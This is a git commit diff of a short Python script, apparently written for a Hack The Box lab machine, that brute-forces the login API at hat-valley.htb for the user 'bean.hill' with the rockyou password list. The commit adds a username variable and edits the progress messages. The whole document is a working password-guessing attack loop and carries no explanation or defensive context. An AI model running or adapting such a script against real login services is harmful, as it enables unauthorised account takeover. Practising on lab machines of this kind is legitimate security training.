de30b1cd64c2db33b7978c5504487428dcbf265a
quoije <mathieumoran1@gmail.com>
2022-10-26 00:55:32 -0400

    not the way but possible

--- quickBF4HTB.py
+++ quickBF4HTB.py
@@ -5,6 +5,7 @@ wordlist = "/usr/share/wordlists/rockyou.txt"
 found = False
 pwn = "nope"
 request = "ayy"
+usern = "bean.hill"
 
 def ayy(username, password):
         endpoint = "http://hat-valley.htb/api/login"
@@ -14,20 +15,21 @@ def ayy(username, password):
             "password" : password,
         }
         r = post(endpoint, json=payload, headers = headers)
-        print(r.text)
+        print("[+] " + r.text)
         return r.text
 
 with open(wordlist,'r') as mariob:
     while found == False:
         for passWL in mariob:
             for pasw in passWL.split():
-                print("[+] testing " + pasw)
-                if ayy("bean.hill", pasw) == "Incorrect username or password":
-                    print(str(found))
+                print("[+++] testing " + usern + ":" + pasw)
+                if ayy(usern, pasw) == "Incorrect username or password":
+                    print("[+] Found?: " + str(found))
                     time.sleep(.01)
                 else:
                     pwn = pasw
                     found = True
+                    print("[+] Found?: " + str(found))
     else:
         print(pasw)
         exit()
